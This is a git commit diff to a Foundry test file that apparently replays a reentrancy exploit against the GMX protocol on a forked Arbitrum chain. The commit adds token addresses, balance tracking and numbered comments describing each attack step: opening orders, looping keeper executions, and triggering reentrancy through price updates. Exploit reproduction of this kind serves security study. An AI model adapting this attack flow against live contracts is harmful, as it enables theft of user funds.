2c105fcad644834b9f8b6832c9dd39c3bfb32801
0xLucca <95830307+0xLucca@users.noreply.github.com>
2025-07-18 14:32:22 -0300

    Improve comments

--- test/Reentrancy/GMXProtocol/gmx.attack.sol
+++ test/Reentrancy/GMXProtocol/gmx.attack.sol
@@ -14,14 +14,36 @@ import {IFastPriceFeed} from "./IFastPriceFeed.sol";
 
 //Contract deployed in arbitrum block 355876960
 contract Exploit_GMX is TestHarness, TokenBalanceTracker{
-
-    IWETH9 internal constant WETH = IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
     IERC20 internal constant USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
-    IERC20 internal constant WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
 
-    address internal constant USDC_WHALE = 0xf89d7b9c864f589bbF53a82105107622B35EaA40;
+    IERC20 internal constant WBTC =
+        IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);
+
+    IWETH9 internal constant WETH =
+        IWETH9(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
+
+    IERC20 internal constant USDCE =
+        IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
+
+    IERC20 internal constant LINK =
+        IERC20(0xf97f4df75117a78c1A5a0DBb814Af92458539FB4);
+
+    IERC20 internal constant UNI =
+        IERC20(0xFa7F8980b0f1E64A2062791cc3b0871572f1F7f0);
+
+    IERC20 internal constant USDT =
+        IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);
+
+    IERC20 internal constant FRAX =
+        IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);
+
+    IERC20 internal constant DAI =
+        IERC20(0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1);
+
+    address internal constant UNISWAPV3_WBTC_USDC = 0x0E4831319A50228B9e450861297aB92dee15B44F;
 
     address internal constant KEEPER = 0xd4266F8F82F7405429EE18559e548979D49160F3;
+
     address internal constant UPDATER = 0x2BcD0d9Dde4bD69C516Af4eBd3fB7173e1FA12d0;
 
     ExploitSC internal exploitSC;
@@ -35,25 +57,38 @@ contract Exploit_GMX is TestHarness, TokenBalanceTracker{
     function setUp() external {
         cheat.createSelectFork("arbitrum", 355876959);
 
-        cheat.deal(address(this),0.8 ether);
+        // Deploy the exploit contract
+        exploitSC = new ExploitSC();
 
+        addTokenToTracker(address(USDC));
+        addTokenToTracker(address(WBTC));
+        addTokenToTracker(address(WETH));
+        addTokenToTracker(address(USDCE));
+        addTokenToTracker(address(LINK));
+        addTokenToTracker(address(UNI));
+        addTokenToTracker(address(USDT));
+        addTokenToTracker(address(FRAX));
+        addTokenToTracker(address(DAI));
+        updateBalanceTracker(address(exploitSC));
+        
+        cheat.deal(address(this),0.8 ether);
+        
         // This does not work. Probably need to update forge-std because token is behind a proxy
         //deal(address(USDC), address(this), 3001000000);
-        vm.prank(USDC_WHALE);
+        vm.prank(UNISWAPV3_WBTC_USDC);
         USDC.transfer(address(this), 3001000000);
     }
 
     function test_attack() external {
-        // Deploy the exploit contract
-        exploitSC = new ExploitSC();
+       logBalancesWithLabel("Balance before exploit:", address(exploitSC));
 
-        // Transfer USDC to the exploit contract
+        // 1. Transfer USDC to the exploit contract
         USDC.transfer(address(exploitSC), 3001000000);
 
-        // Just creates an increase order
+        // 2. Attacker creates an order to long WBTC
         exploitSC.createIncreaseOrder{value: 0.2003 ether}();
 
-        // Keepr executes increase order
+        // 3. Keepr executes order
         vm.prank(KEEPER);
         POSITION_MANAGER.executeIncreaseOrder(
             address(exploitSC), 
@@ -61,15 +96,18 @@ contract Exploit_GMX is TestHarness, TokenBalanceTracker{
             payable(KEEPER)
         );
 
-        // Create a decrease order
+        // 4. Attacker creates a decrease order to withdraw funds from the previous position
         exploitSC.createDecreaseOrder{value: 0.0015 ether}();
 
-        // Keeper executes decrease order and exploit contract executes logic to create a new decrease order in the eth transfer call
+        // Here wbtcBalance is used to determine when the exploit was completed. Multiple iterations of the loop are executed until required conditions are met
         uint256 wbtcBalance = WBTC.balanceOf(address(exploitSC));
 
         uint256 i = 0;
         while (wbtcBalance == 0){
             console2.log("Iteration", i);
+
+            // 5. Keeper executes decrease order and triggers reentrancy in the eth transfer call. The exploit contract executes conditional logic depending on the state of the protocol. First iterations it will increase the position size, and create a decreasePosition. 
+            // CHECK step 6 in ExploitSC.receive() to see how the reentrancy is exploited
             vm.prank(KEEPER);
             POSITION_MANAGER.executeDecreaseOrder(
                 address(exploitSC), 
@@ -77,8 +115,9 @@ contract Exploit_GMX is TestHarness, TokenBalanceTracker{
                 payable(KEEPER)
             );
 
-            // Updater updates a price in the fast price feed
-            // and triggers the execution of decrease orders, generating a call to the gmxPositionCallback in the exploit contract that creates a new decrease order
+            // 7. Updater updates price in the fast price feed
+            // and triggers the execution of decrease position, generating a call to the gmxPositionCallback in the exploit contract that creates a new decrease position order that will be executed in the next iteration by the keeper
+            // CHECK step 8 in ExploitSC.gmxPositionCallback() function
             vm.prank(UPDATER);
             FAST_PRICE_FEED.setPricesWithBitsAndExecute(
                 650780127152856667663437440412910 + i,
@@ -88,8 +127,11 @@ contract Exploit_GMX is TestHarness, TokenBalanceTracker{
                 0,
                 10001
             );
+
             wbtcBalance = WBTC.balanceOf(address(exploitSC));
             i++;
         }
+
+        logBalancesWithLabel("Balance after exploit:", address(exploitSC));
     }
 }
